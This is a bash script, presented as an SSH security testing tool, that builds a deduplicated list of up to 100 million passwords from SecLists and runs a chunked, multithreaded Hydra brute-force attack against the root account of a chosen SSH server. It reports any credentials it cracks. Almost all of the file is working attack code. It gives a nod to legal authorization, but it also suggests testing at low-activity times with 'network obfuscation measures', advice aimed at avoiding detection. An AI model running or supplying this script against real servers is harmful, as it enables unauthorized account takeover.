#!/bin/bash

# Color output configuration
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Configuration parameters
PASSWORDS_DIR="/snap/seclists/current/Passwords"
USER="root"
SERVER=""
PORT="22"
HYDRA_THREADS=16              # Number of concurrent threads
MAX_TRIES=100000000           # Maximum number of attempts (default value reduced)
TEMP_DIR=$(mktemp -d)         # Temporary working directory
TIMEOUT=3                     # Hydra timeout duration
CHUNK_SIZE=10000000           # File split size (10M passwords)
HYDRA_MAX_SIZE=490000000      # Hydra maximum file size limit (approx. 490MB)

# Cleanup function
cleanup() {
    echo -e "${YELLOW}Cleaning up temporary files...${NC}"
    rm -rf "$TEMP_DIR"
}
trap cleanup EXIT

# Clear screen and display header
show_header() {
    clear
    echo -e "${CYAN}======================================${NC}"
    echo -e "${CYAN}      Enhanced Hydra SSH Security Testing Tool      ${NC}"
    echo -e "${CYAN}======================================${NC}"
    echo -e "${YELLOW}Target: ${USER}@${SERVER}:${PORT}${NC}"
    echo -e "${CYAN}--------------------------------------${NC}"
}

# Validate dependencies
check_dependencies() {
    if ! command -v hydra &> /dev/null; then
        echo -e "${RED}Error: Hydra is required${NC}"
        echo -e "Install using: sudo apt-get install hydra"
        exit 1
    fi
    
    if ! command -v split &> /dev/null; then
        echo -e "${RED}Error: coreutils (split command) is required${NC}"
        echo -e "Install using: sudo apt-get install coreutils"
        exit 1
    fi
}

# Smart dictionary merging
prepare_dictionary() {
    echo -e "${BLUE}Scanning dictionary files...${NC}"
    
    # Recursively find all text files
    find "$PASSWORDS_DIR" -type f \( -name "*.txt" -o -name "*.lst" \) -print0 | 
    while IFS= read -r -d $'\0' file; do
        # Filter non-text files (via MIME type)
        if file "$file" | grep -q 'text'; then
            echo -e "${CYAN}Adding dictionary: ${file#$PASSWORDS_DIR/}${NC}"
            # Preprocess dictionary file (deduplicate, filter invalid characters)
            grep -v '^#' "$file" | tr -cd '\11\12\15\40-\176' | sed '/^$/d' >> "$TEMP_DIR/combined.lst"
        fi
    done

    # Final deduplication
    echo -e "${BLUE}Performing final deduplication...${NC}"
    sort -u "$TEMP_DIR/combined.lst" -o "$TEMP_DIR/final.lst"
    
    # Apply maximum attempt limit
    if [ "$MAX_TRIES" -ne 0 ]; then
        echo -e "${YELLOW}Applying maximum attempt limit: $MAX_TRIES${NC}"
        head -n $MAX_TRIES "$TEMP_DIR/final.lst" > "$TEMP_DIR/limited.lst"
        mv "$TEMP_DIR/limited.lst" "$TEMP_DIR/final.lst"
    fi
    
    TOTAL_PASSWORDS=$(wc -l < "$TEMP_DIR/final.lst")
    FILESIZE=$(stat -c%s "$TEMP_DIR/final.lst")
    echo -e "${GREEN}Total valid passwords: $TOTAL_PASSWORDS ${NC}"
    echo -e "${GREEN}Dictionary file size: $(($FILESIZE / 1024 / 1024))MB ${NC}"
    
    # Check if file size exceeds Hydra limit
    if [ "$FILESIZE" -gt "$HYDRA_MAX_SIZE" ]; then
        echo -e "${YELLOW}Warning: Dictionary file exceeds Hydra size limit, splitting into chunks${NC}"
        mkdir -p "$TEMP_DIR/chunks"
        split -l "$CHUNK_SIZE" "$TEMP_DIR/final.lst" "$TEMP_DIR/chunks/passwords-"
        echo -e "${BLUE}Dictionary split into $(ls "$TEMP_DIR/chunks/" | wc -l) smaller files${NC}"
    fi
}

# Execute Hydra attack
run_hydra() {
    echo -e "${CYAN}Starting Hydra engine...${NC}"
    echo -e "${YELLOW}Concurrent threads: $HYDRA_THREADS | Timeout: ${TIMEOUT}s${NC}"
    
    # Create results file
    touch "$TEMP_DIR/results.txt"
    
    # Check if chunking is needed
    if [ -d "$TEMP_DIR/chunks" ] && [ "$(ls -A "$TEMP_DIR/chunks")" ]; then
        echo -e "${YELLOW}Using chunk mode for testing...${NC}"
        chunk_count=$(ls "$TEMP_DIR/chunks/" | wc -l)
        current=1
        
        # Process each chunk sequentially
        for chunk in "$TEMP_DIR/chunks/"*; do
            echo -e "${CYAN}Processing chunk $current / $chunk_count ${NC}"
            
            hydra -l "$USER" \
                  -P "$chunk" \
                  -s "$PORT" \
                  -t "$HYDRA_THREADS" \
                  -w "$TIMEOUT" \
                  -f \
                  -o "$TEMP_DIR/chunk_result.txt" \
                  -I \
                  ssh://"$SERVER"
            
            # If results are found, merge and exit loop
            if grep -q "login:" "$TEMP_DIR/chunk_result.txt"; then
                cat "$TEMP_DIR/chunk_result.txt" >> "$TEMP_DIR/results.txt"
                break
            fi
            
            current=$((current + 1))
        done
    else
        # Single execution
        hydra -l "$USER" \
              -P "$TEMP_DIR/final.lst" \
              -s "$PORT" \
              -t "$HYDRA_THREADS" \
              -w "$TIMEOUT" \
              -f \
              -o "$TEMP_DIR/results.txt" \
              -I \
              ssh://"$SERVER"
    fi

    # Parse results
    if grep -q "login:" "$TEMP_DIR/results.txt"; then
        echo -e "\n${RED}Valid credentials found!${NC}"
        grep "login:" "$TEMP_DIR/results.txt" | awk -F"  " '{print $2}'
        echo -e "${RED}It is recommended to change the SSH password immediately!${NC}"
    else
        echo -e "\n${GREEN}No valid passwords found, current configuration is relatively secure${NC}"
    fi
}

# Main logic flow
main() {
    show_header
    check_dependencies
    
    # Server address validation
    [ -z "$SERVER" ] && read -p "Enter target server IP: " SERVER
    [ -z "$SERVER" ] && { echo -e "${RED}Server address must be specified!${NC}"; exit 1; }

    # Security warning
    echo -e "${RED}Warning: This operation may trigger security alerts on the target system!${NC}"
    echo -e "${YELLOW}Recommendations before testing:"
    echo -e "1. Ensure you have legal authorization"
    echo -e "2. Choose a low-activity time for testing"
    echo -e "3. Configure appropriate network obfuscation measures${NC}"
    
    read -p "Confirm to proceed? (y/n) " -n 1 -r
    echo
    [[ ! $REPLY =~ ^[Yy]$ ]] && { echo -e "${YELLOW}Operation canceled${NC}"; exit 0; }
    
    # Preparation phase
    prepare_dictionary
    
    # Performance hint
    ESTIMATE_TIME=$(( TOTAL_PASSWORDS / HYDRA_THREADS / 10 ))
    echo -e "\n${CYAN}Estimated testing time: ${ESTIMATE_TIME} seconds (based on current network conditions)${NC}"
    
    # Execute attack
    run_hydra
}

# Start main program
main
